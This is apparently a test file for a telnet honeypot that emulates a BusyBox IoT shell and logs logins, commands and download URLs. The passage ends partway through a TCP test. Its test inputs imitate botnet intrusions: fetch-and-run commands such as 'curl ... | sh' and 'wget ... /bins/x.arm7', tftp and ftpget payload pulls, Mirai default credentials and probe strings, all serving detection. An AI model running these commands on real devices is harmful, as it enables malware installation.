# Tests for the honeypot: the telnet parser, the line splitter, the fake
# shell, the event log lines and the database, then the server driven over
# TCP.

load "std/test"
load "std/sqlite"
load "std/string"
load "std/table"
load "./telnet"
load "./lines"
load "./shell"
load "./recorder"
load "./server"

let PORT = 62323
let WAIT_MS = 2000

let IAC = chr(255)
let DO = chr(253)
let DONT = chr(254)
let WILL = chr(251)
let WONT = chr(252)
let SB = chr(250)
let SE = chr(240)
let ECHO = chr(1)
let SGA = chr(3)
let TTYPE = chr(24)

# Feeds `pieces` in turn; returns the data and replies joined, and every
# event.
fn feed_all(t, pieces)
  let data = buf_new()
  let reply = buf_new()
  let events = []
  for piece in pieces
    let r = telnet.feed(t, piece)
    buf_push(data, r.data)
    buf_push(reply, r.reply)
    for ev in r.events
      push(events, ev)
    end
  end
  {data: to_string(data), reply: to_string(reply), events: events}
end

# ─── Telnet ────────────────────────────────────────────────────

test.case("telnet passes plain data through") do
  let r = telnet.feed(telnet.new(), "root\r\n")
  test.assert_eq(r, {data: "root\r\n", reply: "", events: []})
  test.assert_eq(telnet.feed(telnet.new(), "").data, "")
end

test.case("telnet strips commands and unescapes IAC IAC") do
  let nop = IAC + chr(241)
  let r = telnet.feed(telnet.new(), "a" + nop + "b" + IAC + IAC + "c" + IAC + chr(249))
  test.assert_eq(r.data, "ab" + IAC + "c")
  test.assert_eq(r.reply, "")
end

test.case("telnet answers option requests once each") do
  let t = telnet.new()
  test.assert_eq(telnet.echoing(t), false)
  let r = telnet.feed(t, IAC + DO + ECHO + IAC + DO + SGA + IAC + DO + TTYPE + IAC + WILL + TTYPE + IAC + WILL + SGA)
  test.assert_eq(r.data, "")
  test.assert_eq(r.reply, IAC + WONT + TTYPE + IAC + DONT + TTYPE + IAC + DO + SGA)
  test.assert_eq(telnet.echoing(t), true)
  test.assert_eq(telnet.feed(t, IAC + DO + TTYPE + IAC + WILL + TTYPE).reply, "")
  r = telnet.feed(t, IAC + DONT + ECHO + IAC + WONT + TTYPE)
  test.assert_eq(r.reply, IAC + WONT + ECHO)
  test.assert_eq(telnet.echoing(t), false)
end

test.case("telnet skips subnegotiations") do
  let r = telnet.feed(telnet.new(), "a" + IAC + SB + TTYPE + chr(0) + "xterm" + IAC + IAC + IAC + SE + "b")
  test.assert_eq(r.data, "ab")
  test.assert_eq(r.events, [])
end

test.case("telnet abandons a subnegotiation over the cap") do
  let t = telnet.new(4)
  let r = telnet.feed(t, IAC + SB + "123456789")
  test.assert_eq(r.data, "6789")
  test.assert_eq(r.events, [{kind: "cap", cap: "subneg_too_long"}])
  test.assert_eq(telnet.feed(t, "ok").data, "ok")
end

test.case("telnet commands split across reads, at every byte") do
  let stream = "lo" + IAC + DO + ECHO + "g" + IAC + IAC + IAC + SB + "xy" + IAC + SE + "in" + IAC + WILL + TTYPE + "\r\n" + IAC
  let whole = feed_all(telnet.new(), [stream])
  test.assert_eq(whole.data, "log" + IAC + "in\r\n")
  test.assert_eq(whole.reply, IAC + DONT + TTYPE)
  for cut = 1, len(stream)
    let r = feed_all(telnet.new(), [substr(stream, 0, cut), substr(stream, cut)])
    test.assert_eq(r, whole, "cut at {cut}")
  end
  let bytes = []
  for ch in stream
    push(bytes, ch)
  end
  test.assert_eq(feed_all(telnet.new(), bytes), whole)
end

test.case("telnet escape doubles 255") do
  test.assert_eq(telnet.escape("a" + IAC + "b"), "a" + IAC + IAC + "b")
  test.assert_eq(telnet.escape("plain"), "plain")
end

# ─── Lines ─────────────────────────────────────────────────────

fn texts(r)
  table.map(r.lines, fn(ln) ln.text end)
end


# Feeds `pieces` in turn; returns every line's text and the too-long count.
fn split_all(sp, pieces)
  let out = []
  let too_long = 0
  for piece in pieces
    let r = lines.feed(sp, piece)
    for ln in r.lines
      push(out, ln.text)
    end
    too_long = too_long + r.too_long
  end
  {lines: out, too_long: too_long}
end

test.case("lines end at CR LF, CR NUL, LF and a lone CR") do
  let r = lines.feed(lines.new(), "a\r\nb\r\0c\nd\re")
  test.assert_eq(texts(r), ["a", "b", "c", "d"])
  test.assert_eq(r.rest, 10)
  test.assert_eq(texts(lines.feed(lines.new(), "\r\n\n\r\0")), ["", "", ""])
  test.assert_eq(texts(lines.feed(lines.new(), "a\0b\n")), ["a\0b"])
end

test.case("lines give each line's place in the chunk") do
  let sp = lines.new()
  lines.feed(sp, "ro")
  let r = lines.feed(sp, "ot\r\nls\n")
  test.assert_eq(r.lines, [{text: "root", from: 0, to: 2}, {text: "ls", from: 4, to: 6}])
  test.assert_eq(r.rest, 7)
end

test.case("lines: a CR at the end of a chunk") do
  let sp = lines.new()
  test.assert_eq(texts(lines.feed(sp, "a\r")), ["a"])
  let r = lines.feed(sp, "\nb\r")
  test.assert_eq(texts(r), ["b"])
  test.assert_eq(texts(lines.feed(sp, "")), [])
  test.assert_eq(texts(lines.feed(sp, chr(0) + "c\n")), ["c"])
  test.assert_eq(texts(lines.feed(sp, "\r")), [""])
  test.assert_eq(texts(lines.feed(sp, "d\n")), ["d"])
end

test.case("lines split at every byte") do
  let stream = "user\r\npass\r\0\r\nls -la\ncd\r\r\nx"
  let whole = split_all(lines.new(), [stream])
  test.assert_eq(whole.lines, ["user", "pass", "", "ls -la", "cd", ""])
  for cut = 1, len(stream)
    test.assert_eq(split_all(lines.new(), [substr(stream, 0, cut), substr(stream, cut)]), whole, "cut at {cut}")
  end
  let bytes = []
  for ch in stream
    push(bytes, ch)
  end
  test.assert_eq(split_all(lines.new(), bytes), whole)
end

test.case("lines drop a line over the limit") do
  let sp = lines.new(8)
  let r = split_all(sp, ["123456789\nok\n"])
  test.assert_eq(r, {lines: ["ok"], too_long: 1})
  r = split_all(sp, ["12345", "6789", string.repeat("x", 100000)])
  test.assert_eq(r, {lines: [], too_long: 1})
  test.assert(lines.dropping(sp))
  test.assert_eq(split_all(sp, ["more\nnext\n"]), {lines: ["next"], too_long: 0})
  test.assert_eq(lines.dropping(sp), false)
  test.assert_eq(split_all(lines.new(8), ["12345678\n"]), {lines: ["12345678"], too_long: 0})
end

test.case("lines: many CRs and a far LF") do
  let r = lines.feed(lines.new(), string.repeat("\r", 50000) + "\n")
  test.assert_eq(len(r.lines), 50000)
end

# ─── Shell ─────────────────────────────────────────────────────

fn logged_in_shell()
  let sh = shell.new({accept_on: 1})
  shell.line(sh, "root")
  shell.line(sh, "root")
  sh
end

# The output of `text` typed at the prompt, without the prompt.
fn run(sh, text)
  let out = shell.line(sh, text).out
  if string.ends_with(out, "# ")
    return substr(out, 0, len(out) - 2)
  end
  out
end

test.case("login: the nth attempt succeeds") do
  let sh = shell.new({accept_on: 2})
  test.assert_eq(shell.greeting(sh), "\nlocalhost login: ")
  test.assert_eq(shell.line(sh, "  ").out, "localhost login: ")
  test.assert_eq(shell.line(sh, "admin"), {out: "Password: ", events: []})
  test.assert_eq(shell.echoes(sh), false)
  let r = shell.line(sh, "admin")
  test.assert_eq(r.out, "\nLogin incorrect\nlocalhost login: ")
  test.assert_eq(r.events, [{kind: "login", user: "admin", password: "admin", ok: false}])
  test.assert(shell.echoes(sh))
  shell.line(sh, "root")
  r = shell.line(sh, "xc3511")
  test.assert_eq(r.events, [{kind: "login", user: "root", password: "xc3511", ok: true}])
  test.assert(string.contains(r.out, "BusyBox v1.24.1"))
  test.assert(string.ends_with(r.out, "\n# "))
  test.assert(shell.logged_in(sh))
end

test.case("login: accept_chance 1.0 lets the first attempt in") do
  let sh = shell.new({accept_on: 100, accept_chance: 1.0})
  shell.line(sh, "u")
  test.assert(shell.line(sh, "p").events[0].ok)
end

test.case("parse: words, quotes and operators") do
  let cmds = shell.parse("echo 'a;b' \"c\\\"d\" e\\ f; x && y || z | w & v # comment")
  test.assert_eq(table.map(cmds, fn(c) c.words end), [["echo", "a;b", "c\"d", "e f"], ["x"], ["y"], ["z"], ["w"], ["v"]])
  test.assert_eq(table.map(cmds, fn(c) c.op end), [";", "&&", "||", "|", ";", nil])
  test.assert_eq(shell.parse(""), [])
  test.assert_eq(shell.parse(" ;; ; "), [])
  test.assert_eq(shell.parse("echo 'unclosed")[0].words, ["echo", "unclosed"])
end

test.case("parse: redirects") do
  let c = shell.parse("echo hi > /dev/null 2>&1")[0]
  test.assert_eq(c.words, ["echo", "hi"])
  test.assert(c.quiet)
  c = shell.parse("cat x 2>/dev/null")[0]
  test.assert_eq(c.words, ["cat", "x"])
  test.assert_eq([c.quiet, c.quiet_err], [false, true])
  c = shell.parse("echo a>>f b <in")[0]
  test.assert_eq(c.words, ["echo", "a", "b"])
  test.assert(c.quiet)
  for line in ["nope >/dev/null 2>&1", "nope &>/dev/null", "nope 2>/dev/null >&2"]
    c = shell.parse(line)[0]
    test.assert_eq([c.words, c.quiet, c.quiet_err], [["nope"], true, true], line)
  end
  c = shell.parse("nope 2>&1 >/dev/null")[0]
  test.assert_eq([c.quiet, c.quiet_err], [true, false])
end

test.case("parse: command substitutions stay whole") do
  let cmds = shell.parse("echo $(id; uname -a) `a; b` \"x$(c (d) e)y\"; ls")
  test.assert_eq(table.map(cmds, fn(c) c.words end), [["echo", "$(id; uname -a)", "`a; b`", "x$(c (d) e)y"], ["ls"]])
  test.assert_eq(shell.parse("echo $(unclosed; x")[0].words, ["echo", "$(unclosed; x"])
  test.assert_eq(shell.parse("echo '$(id)'")[0].words, ["echo", "$(id)"])
  let seen = []
  shell.parse("a $(b) \"`c`\" '$(d)'", fn(inner)
    push(seen, inner)
    "<{inner}>"
  end)
  test.assert_eq(seen, ["b", "c"])
end

test.case("shell: canned commands") do
  let sh = logged_in_shell()
  test.assert_eq(run(sh, "/bin/busybox ECCHI"), "ECCHI: applet not found\n")
  test.assert_eq(run(sh, "busybox cat /nope"), "cat: can't open '/nope': No such file or directory\n")
  test.assert(string.starts_with(run(sh, "busybox"), "BusyBox v1.24.1"))
  test.assert_eq(run(sh, "nmap"), "sh: nmap: not found\n")
  test.assert_eq(run(sh, "uname -m"), "armv7l\n")
  test.assert_eq(run(sh, "uname"), "Linux\n")
  test.assert(string.contains(run(sh, "cat /proc/cpuinfo"), "ARMv7"))
  test.assert(string.contains(run(sh, "/bin/cat /proc/mounts"), "squashfs"))
  test.assert(string.contains(run(sh, "ps"), "telnetd"))
  test.assert(string.contains(run(sh, "ls -la /"), "proc"))
  test.assert_eq(run(sh, "ls /tmp"), "")
  for silent in ["enable", "system", "shell", "sh", "linuxshell", "cd /tmp", "chmod 777 x", "./x arm7", "/tmp/x", ""]
    test.assert_eq(run(sh, silent), "", silent)
  end
  test.assert_eq(shell.line(sh, "").out, "# ")
  test.assert_eq(shell.line(sh, "").events, [])
end

test.case("shell: echo") do
  let sh = logged_in_shell()
  test.assert_eq(run(sh, "echo hello  world"), "hello world\n")
  test.assert_eq(run(sh, "echo -n x"), "x")
  test.assert_eq(run(sh, "echo '\\x41'"), "\\x41\n")
  let r = shell.line(sh, "echo -ne '\\x7f\\x45LF\\0101\\x0\\xzz\\\\\\cignored'")
  test.assert_eq(r.events[1], {kind: "echo", bytes: chr(127) + "ELFA" + chr(0) + "\\xzz\\"})
  test.assert_eq(r.out, chr(127) + "ELFA" + chr(0) + "\\xzz\\# ")
  test.assert_eq(shell.decode_escapes("a\\tb\\n\\q\\"), "a\tb\n\\q\\")
end

test.case("shell: downloads log their URL") do
  let sh = logged_in_shell()
  let r = shell.line(sh, "cd /tmp; wget http://1.2.3.4:8080/bins/x.arm7 -O y; tftp -g -r mips -l m 5.6.7.8 69")
  test.assert_eq(table.filter(r.events, fn(e) e.kind == "url" end), [
    {kind: "url", url: "http://1.2.3.4:8080/bins/x.arm7", via: "wget"},
    {kind: "url", url: "tftp://5.6.7.8:69/mips", via: "tftp"}
  ])
  test.assert(string.starts_with(r.out, "Connecting to 1.2.3.4 (1.2.3.4:80)\nsaving to 'y'\n"))
  r = shell.line(sh, "curl -s -o a http://h/c.sh | sh; /bin/busybox ftpget 9.9.9.9 b b.mips; tftp 7.7.7.7 -c get t.sh; wget -q")
  test.assert_eq(table.map(table.filter(r.events, fn(e) e.kind == "url" end), fn(e) e.url end), [
    "http://h/c.sh", "ftp://9.9.9.9/b.mips", "tftp://7.7.7.7/t.sh"
  ])
  test.assert(string.contains(r.out, "Usage: wget"))
end

test.case("shell: && and || follow fake exit statuses") do
  let sh = logged_in_shell()
  test.assert_eq(run(sh, "nope && echo a || echo b"), "sh: nope: not found\nb\n")
  test.assert_eq(run(sh, "echo a && echo b || echo c"), "a\nb\n")
  test.assert_eq(run(sh, "false || true && echo d"), "d\n")
end

test.case("shell: pipelines and redirects") do
  let sh = logged_in_shell()
  test.assert(string.contains(run(sh, "cat /proc/cpuinfo | grep name | head -n 1"), "model name"))
  test.assert_eq(run(sh, "echo a | nope"), "sh: nope: not found\n")
  test.assert_eq(run(sh, "echo a > /tmp/f"), "")
  test.assert_eq(run(sh, "nope 2>/dev/null"), "")
  test.assert_eq(run(sh, "nope > /dev/null"), "sh: nope: not found\n")
  test.assert_eq(run(sh, "wget http://a/b >/dev/null 2>&1"), "")
  test.assert_eq(run(sh, "nope 2>&1"), "sh: nope: not found\n")
end

test.case("shell: command substitutions run") do
  let sh = logged_in_shell()
  let r = shell.line(sh, "echo $(echo -n a; echo b) \"[`uname -m`]\"")
  test.assert_eq(r.out, "ab [armv7l]\n# ")
  r = shell.line(sh, "sh -c \"$(wget http://e.x/s.sh -O -)\"")
  test.assert_eq(table.map(table.filter(r.events, fn(e) e.kind == "url" end), fn(e) e.url end), ["http://e.x/s.sh"])
  test.assert(string.starts_with(r.out, "Connecting to e.x"))
  test.assert_eq(run(sh, "echo $(nope)x"), "sh: nope: not found\nx\n")
  test.assert_eq(run(sh, "echo $(echo $(echo $(echo $(echo $(echo deep)))))"), "$(echo deep)\n")
  test.assert_eq(run(sh, "echo $(exit) still"), " still\n")
  test.assert_eq(shell.closed(sh), false)
end

test.case("shell: exit ends the session") do
  let sh = logged_in_shell()
  let r = shell.line(sh, "exit; echo after")
  test.assert_eq(r.out, "")
  test.assert(shell.closed(sh))
end

# ─── Event log lines ───────────────────────────────────────────

test.case("recorder quotes every unprintable byte") do
  test.assert_eq(recorder.quote("ab"), "\"ab\"")
  test.assert_eq(recorder.quote("a\"b\\c" + chr(0) + chr(27) + "[" + chr(255) + "\n"), "\"a\\\"b\\\\c\\x00\\x1b[\\xff\\x0a\"")
  test.assert_eq(recorder.quote(""), "\"\"")
end

test.case("recorder formats an event") do
  let ev = {kind: "login", user: "root", password: "x y", ok: true, session: 7, time: 0}
  test.assert_eq(recorder.format(ev), "1970-01-01T00:00:00Z session=7 login user=\"root\" password=\"x y\" ok=true")
  test.assert_eq(recorder.format({kind: "refused", ip: "1.2.3.4", time: 0}), "1970-01-01T00:00:00Z refused ip=\"1.2.3.4\"")
end

# A fresh directory for `body(dir)`, removed afterwards.
fn with_dir(body)
  let dir = "/tmp/gem_honeypot_test_{epoch_ms()}_{floor(random() * 1000000)}"
  mkdir(dir)
  let r = pcall body(dir)
  exec("rm -rf '{dir}'")
  if not r.ok
    error(r.error)
  end
end

# Stops the recorder `pid` and waits for it to exit.
fn stop_recorder(pid)
  monitor(pid)
  kill(pid, "shutdown")
  receive
  when {tag: "DOWN", pid: ^pid} then nil
  after WAIT_MS then error("recorder did not stop")
  end
end

fn rows(file, sql)
  let db = sqlite.open(file)
  let r = sqlite.query(db, sql)
  sqlite.close(db)
  r
end

test.case("recorder: one file per week, from Monday") do
  test.assert_eq(recorder.file_name(1760054400000), "honeypot-2025-10-06.db")
  test.assert_eq(recorder.file_name(1759708800000), "honeypot-2025-10-06.db")
  test.assert_eq(recorder.file_name(1759708799999), "honeypot-2025-09-29.db")
  test.assert_eq(recorder.file_name(1760313599999), "honeypot-2025-10-06.db")
  test.assert_eq(recorder.file_name(1760313600000), "honeypot-2025-10-13.db")
end

test.case("recorder: prune keeps the newest weeks and the current one") do
  with_dir do |dir|
    for f in ["honeypot-2025-09-29.db", "honeypot-2025-09-29.db-wal", "honeypot-2025-10-06.db", "honeypot-2025-10-13.db", "honeypot-2025-10-13.db-shm", "notes.txt"]
      write_file(path_join(dir, f), "")
    end
    recorder.prune(dir, 2)
    test.assert_eq(sort(list_dir(dir)), ["honeypot-2025-10-06.db", "honeypot-2025-10-13.db", "honeypot-2025-10-13.db-shm", "notes.txt"])
    recorder.prune(dir, 1, "honeypot-2025-10-06.db")
    test.assert_eq(sort(list_dir(dir)), ["honeypot-2025-10-06.db", "honeypot-2025-10-13.db", "honeypot-2025-10-13.db-shm", "notes.txt"])
    recorder.prune(dir, 1)
    test.assert_eq(sort(list_dir(dir)), ["honeypot-2025-10-13.db", "honeypot-2025-10-13.db-shm", "notes.txt"])
  end
end

test.case("recorder: stores events by session") do
  with_dir do |dir|
    let pid = recorder.start("hp_test_recorder", {dir: dir, clock: fn() 1760054400000 end})
    let raw = "root" + chr(0) + chr(255) + "\r\n"
    let evs = [
      {kind: "session_start", session: 10, ip: "1.2.3.4", port: 5555},
      {kind: "input", session: 10, bytes: raw},
      {kind: "login", session: 10, user: "root", password: "x" + chr(200), ok: false},
      {kind: "command", session: 10, line: "wget http://e.x/a"},
      {kind: "url", session: 10, url: "http://e.x/a", via: "wget"},
      {kind: "echo", session: 10, bytes: "ELF" + chr(0)},
      {kind: "cap", session: 10, cap: "line_too_long"},
      {kind: "session_start", session: 11, ip: "5.6.7.8", port: 1},
      {kind: "error", session: 11, reason: "boom", trace: "at f (x.gem:1)", bytes_in: 7, bytes_out: 8, logged_in: true},
      {kind: "crash", session: 11, reason: "boom"},
      {kind: "session_start", session: 12, ip: "9.9.9.9", port: 2},
      {kind: "crash", session: 12, reason: "killed"},
      {kind: "command", session: 13, line: "ls"},
      {kind: "cap", cap: "spawn_failed", ip: "6.6.6.6", detail: "spawn: process table full"},
      {kind: "session_end", session: 10, reason: "exit", bytes_in: 100, bytes_out: 200, logged_in: false}
    ]
    for ev in evs
      recorder.emit("hp_test_recorder", ev)
    end
    let file = recorder.sync("hp_test_recorder")
    test.assert_eq(file, path_join(dir, "honeypot-2025-10-06.db"))
    let sessions = rows(file, "SELECT pid, ip, port, end_reason, bytes_in, bytes_out, logged_in FROM sessions ORDER BY id")
    test.assert_eq(sessions, [
      {pid: 10, ip: "1.2.3.4", port: 5555, end_reason: "exit", bytes_in: 100, bytes_out: 200, logged_in: 0},
      {pid: 11, ip: "5.6.7.8", port: 1, end_reason: "crash", bytes_in: 7, bytes_out: 8, logged_in: 1},
      {pid: 12, ip: "9.9.9.9", port: 2, end_reason: "crash", bytes_in: nil, bytes_out: nil, logged_in: nil},
      {pid: 13, ip: nil, port: nil, end_reason: nil, bytes_in: nil, bytes_out: nil, logged_in: nil}
    ])
    test.assert_eq(rows(file, "SELECT typeof(bytes) AS t, bytes FROM input"), [{t: "blob", bytes: raw}])
    test.assert_eq(rows(file, "SELECT username, password, ok FROM logins"), [{username: "root", password: "x" + chr(200), ok: 0}])
    test.assert_eq(rows(file, "SELECT line FROM commands ORDER BY rowid"), [{line: "wget http://e.x/a"}, {line: "ls"}])
    test.assert_eq(rows(file, "SELECT url, via FROM urls"), [{url: "http://e.x/a", via: "wget"}])
    test.assert_eq(rows(file, "SELECT bytes FROM echoes"), [{bytes: "ELF" + chr(0)}])
    test.assert_eq(rows(file, "SELECT s.pid, c.reason, c.trace FROM crashes c JOIN sessions s ON s.id = c.session_id ORDER BY c.rowid"), [
      {pid: 11, reason: "boom", trace: "at f (x.gem:1)"},
      {pid: 12, reason: "killed", trace: nil}
    ])
    test.assert_eq(rows(file, "SELECT session_id IS NULL AS free, cap, ip, detail FROM cap_events ORDER BY rowid"), [
      {free: 0, cap: "line_too_long", ip: nil, detail: nil},
      {free: 1, cap: "spawn_failed", ip: "6.6.6.6", detail: "spawn: process table full"}
    ])
    stop_recorder(pid)
  end
end

test.case("recorder: a new week starts a new file, an old one is pruned") do
  with_dir do |dir|
    # The recorder's clock is a fn the spawn copies, so the time it
    # returns lives in a file this process changes.
    let now_file = path_join(dir, "now")
    let set_now = fn(ms) write_file(now_file, to_string(ms)) end
    let week = 7 * 86400000
    set_now(1760054400000)
    let pid = recorder.start("hp_test_recorder", {dir: dir, keep_weeks: 2, clock: fn() to_int(read_file(now_file)) end})
    recorder.emit(pid, {kind: "session_start", session: 20, ip: "1.2.3.4", port: 9})
    let first = recorder.sync(pid)
    set_now(1760054400000 + week)
    recorder.emit(pid, {kind: "command", session: 20, line: "id"})
    let second = recorder.sync(pid)
    test.assert_neq(first, second)
    test.assert_eq(rows(second, "SELECT pid, ip, port FROM sessions"), [{pid: 20, ip: "1.2.3.4", port: 9}])
    test.assert_eq(rows(second, "SELECT line FROM commands"), [{line: "id"}])
    test.assert_eq(rows(first, "SELECT count(*) AS n FROM commands"), [{n: 0}])
    test.assert_eq(rows(first, "SELECT end_reason FROM sessions"), [{end_reason: "week_end"}])
    set_now(1760054400000 + 2 * week)
    recorder.emit(pid, {kind: "session_end", session: 20, reason: "idle"})
    let third = recorder.sync(pid)
    test.assert_eq(file_exists(first), false)
    test.assert(file_exists(second))
    test.assert_eq(rows(third, "SELECT pid, end_reason FROM sessions"), [{pid: 20, end_reason: "idle"}])
    stop_recorder(pid)
  end
end

test.case("recorder: stores what it holds when it is stopped") do
  with_dir do |dir|
    let pid = recorder.start("hp_test_recorder", {dir: dir})
    recorder.emit(pid, {kind: "command", session: 30, line: "uname -a"})
    stop_recorder(pid)
    let files = list_dir(dir)
    test.assert_eq(len(table.filter(files, fn(f) string.ends_with(f, ".db") end)), 1)
    let file = path_join(dir, recorder.file_name(epoch_ms()))
    test.assert_eq(rows(file, "SELECT line FROM commands"), [{line: "uname -a"}])
  end
end

test.case("recorder: ends the rows of sessions that died unseen") do
  with_dir do |dir|
    let pid = recorder.start("hp_test_recorder", {dir: dir, sweep_ms: 20})
    let gone = spawn_monitor(fn() nil end).pid
    let crashed = spawn_monitor(fn() nil end).pid
    for i = 0, 2
      receive
      when {tag: "DOWN"} then nil
      end
    end
    recorder.emit(pid, {kind: "session_start", session: gone, ip: "1.1.1.1", port: 1})
    recorder.emit(pid, {kind: "session_start", session: crashed, ip: "2.2.2.2", port: 2})
    recorder.emit(pid, {kind: "error", session: crashed, reason: "bad", trace: "at f (x.gem:1)", bytes_in: 3, bytes_out: 4, logged_in: false})
    recorder.emit(pid, {kind: "session_start", session: self(), ip: "3.3.3.3", port: 3})
    sleep(200)
    let file = recorder.sync(pid)
    test.assert_eq(rows(file, "SELECT ip, end_reason, bytes_in FROM sessions ORDER BY id"), [
      {ip: "1.1.1.1", end_reason: "lost", bytes_in: nil},
      {ip: "2.2.2.2", end_reason: "crash", bytes_in: 3},
      {ip: "3.3.3.3", end_reason: nil, bytes_in: nil}
    ])
    test.assert_eq(rows(file, "SELECT reason, trace FROM crashes"), [{reason: "bad", trace: "at f (x.gem:1)"}])
    stop_recorder(pid)
  end
end

test.case("recorder: a new recorder ends the rows the last one left open") do
  with_dir do |dir|
    let since = epoch_ms()
    let gone = spawn_monitor(fn() nil end).pid
    receive
    when {tag: "DOWN", pid: ^gone} then nil
    end
    let first = recorder.start("hp_test_recorder", {dir: dir, since: since})
    recorder.emit(first, {kind: "session_start", session: gone, ip: "1.1.1.1", port: 1})
    recorder.emit(first, {kind: "session_start", session: self(), ip: "2.2.2.2", port: 2})
    let file = recorder.sync(first)
    stop_recorder(first)
    let second = recorder.start("hp_test_recorder", {dir: dir, since: since, sweep_ms: 20})
    sleep(200)
    recorder.emit(second, {kind: "command", session: self(), line: "id"})
    recorder.sync(second)
    test.assert_eq(rows(file, "SELECT ip, end_reason FROM sessions ORDER BY id"), [
      {ip: "1.1.1.1", end_reason: "lost"},
      {ip: "2.2.2.2", end_reason: nil}
    ])
    test.assert_eq(rows(file, "SELECT s.ip FROM commands c JOIN sessions s ON s.id = c.session_id"), [{ip: "2.2.2.2"}])
    stop_recorder(second)
    let third = recorder.start("hp_test_recorder", {dir: dir, since: epoch_ms() + 1})
    test.assert_eq(rows(file, "SELECT ip, end_reason FROM sessions ORDER BY id"), [
      {ip: "1.1.1.1", end_reason: "lost"},
      {ip: "2.2.2.2", end_reason: "lost"}
    ])
    stop_recorder(third)
  end
end

test.case("recorder: a new recorder ends the rows open in other weeks' files") do
  with_dir do |dir|
    let old_week = recorder.start("hp_test_recorder", {dir: dir, clock: fn() 1760054400000 end})
    recorder.emit(old_week, {kind: "session_start", session: self(), ip: "1.1.1.1", port: 1})
    sleep(5)
    let since = epoch_ms()
    recorder.emit(old_week, {kind: "session_start", session: self() + 1, ip: "2.2.2.2", port: 2})
    let file = recorder.sync(old_week)
    stop_recorder(old_week)
    let pid = recorder.start("hp_test_recorder", {dir: dir, since: since})
    test.assert_eq(rows(file, "SELECT ip, end_reason FROM sessions ORDER BY id"), [
      {ip: "1.1.1.1", end_reason: "lost"},
      {ip: "2.2.2.2", end_reason: "week_end"}
    ])
    stop_recorder(pid)
  end
end

# ─── Over TCP ──────────────────────────────────────────────────

# Reads from `sock` until what was read ends with `marker`; returns all of
# it. Raises after WAIT_MS.
fn read_until(sock, marker)
  let got = buf_new()
  let tail = ""
  let deadline = time_ms() + WAIT_MS
  while not string.ends_with(tail, marker)
    let chunk = tcp_read(sock, 4096, deadline - time_ms())
    if chunk == nil or chunk == ""
      error("read_until: wanted {marker}, got {to_string(got)}")
    end
    buf_push(got, chunk)
    tail = tail + chunk
    if len(tail) > len(marker)
      tail = substr(tail, len(tail) - len(marker))
    end
  end
  to_string(got)
end

# The events of one session, up to its session_end; its raw input too
# with `with_input`.
fn session_events(with_input = false)
  let evs = []
  while true
    receive
    when {tag: "hp_event", event: ev}
      if with_input or ev.kind != "input"
        push(evs, ev)
      end
      if ev.kind == "session_end" then return evs end
    after WAIT_MS
      error("session_events: no session_end; got {evs}")
    end
  end
end

fn kinds(evs)
  table.map(evs, fn(e) e.kind end)
end

fn input_of(evs)
  string.join(table.map(table.filter(evs, fn(e) e.kind == "input" end), fn(e) e.bytes end), "")
end

# Runs `body` against a server on PORT that sends its events to this
# process, unless `opts` has `data`, the recorder's directory.
fn with_server(opts, body)
  let listener = tcp_listen("127.0.0.1", PORT)
  if not has_key(opts, "data")
    opts.events = self()
  end
  let sup = server.start(listener, opts)
  let r = pcall body()
  server.stop(sup)
  tcp_close(listener)
  if not r.ok
    error(r.error)
  end
end

test.case("tcp: a session from login to exit") do
  with_server({accept_on: 1, accept_chance: 0.0}) do
    let sock = tcp_connect("127.0.0.1", PORT)
    let sent = 0
    let all_sent = ""
    let say = fn(text)
      sent += len(text)
      all_sent += text
      tcp_write(sock, text, 1000)
    end
    let hello = read_until(sock, "login: ")
    test.assert_eq(hello, telnet.OFFER + "\r\nlocalhost login: ")
    say(IAC + DO + ECHO + IAC + DO + SGA + IAC + WILL + TTYPE + "ro")
    test.assert_eq(read_until(sock, "ro"), IAC + DONT + TTYPE + "ro")
    say("ot\r\n")
    test.assert_eq(read_until(sock, "Password: "), "ot\r\nPassword: ")
    say("s3cret\r\0")
    let motd = read_until(sock, "# ")
    test.assert(not string.contains(motd, "s3cret"))
    say("echo " + IAC + IAC + "x; wget http://e.x/a\r\n")
    let out = read_until(sock, "# ")
    test.assert(string.starts_with(out, "echo " + IAC + IAC + "x; wget http://e.x/a\r\n" + IAC + IAC + "x\r\nConnecting to e.x"))
    say("exit\r\n")
    test.assert_eq(read_until(sock, "exit\r\n"), "exit\r\n")
    test.assert_eq(tcp_read(sock, 4096, WAIT_MS), "")
    tcp_close(sock)
    let with_input = session_events(true)
    test.assert_eq(input_of(with_input), all_sent)
    let evs = table.filter(with_input, fn(e) e.kind != "input" end)
    test.assert_eq(kinds(evs), ["session_start", "login", "command", "url", "command", "session_end"])
    test.assert_eq(evs[0].ip, "127.0.0.1")
    test.assert_eq([evs[1].user, evs[1].password, evs[1].ok], ["root", "s3cret", true])
    test.assert_eq(evs[2].line, "echo " + IAC + "x; wget http://e.x/a")
    test.assert_eq(evs[3].url, "http://e.x/a")
    test.assert_eq([evs[5].reason, evs[5].logged_in], ["exit", true])
    test.assert_eq(evs[5].bytes_in, sent)
    test.assert(table.all(evs, fn(e) e.session == evs[0].session end))
  end
end

test.case("tcp: a bot that ignores negotiation and sends it all at once") do
  with_server({accept_on: 1, accept_chance: 0.0}) do
    let sock = tcp_connect("127.0.0.1", PORT)
    read_until(sock, "login: ")
    tcp_write(sock, "admin\r\nadmin\r\nenable\r\nsystem\r\nshell\r\nsh\r\n/bin/busybox MIRAI\r\n", 1000)
    let out = read_until(sock, "MIRAI: applet not found\r\n# ")
    test.assert(not string.contains(out, "admin"))
    tcp_close(sock)
    let evs = session_events()
    test.assert_eq(kinds(evs), ["session_start", "login", "command", "command", "command", "command", "command", "session_end"])
    test.assert_eq(evs[7].reason, "closed")
  end
end

test.case("tcp: idle clients and clients that leave at once") do
  with_server({idle_ms: 100}) do
    let sock = tcp_connect("127.0.0.1", PORT)
    read_until(sock, "login: ")
    test.assert_eq(tcp_read(sock, 4096, WAIT_MS), "")
    tcp_close(sock)
    let evs = session_events()
    test.assert_eq([evs[1].reason, evs[1].logged_in], ["idle", false])
    let quick = tcp_connect("127.0.0.1", PORT)
    tcp_close(quick)
    let ends = session_events()
    test.assert(ends[len(ends) - 1].reason == "closed" or ends[len(ends) - 1].reason == "write_failed")
  end
end

test.case("tcp: an endless line and an endless subnegotiation stay capped") do
  with_server({max_line: 1000, max_subneg: 100}) do
    let sock = tcp_connect("127.0.0.1", PORT)
    read_until(sock, "login: ")
    let junk = string.repeat("A", 65536)
    for i = 0, 16
      tcp_write(sock, junk, 1000)
    end
    tcp_write(sock, IAC + SB + junk + "\r\nroot\r\n", 1000)
    test.assert(string.ends_with(read_until(sock, "Password: "), "Password: "))
    tcp_close(sock)
    let evs = session_events(true)
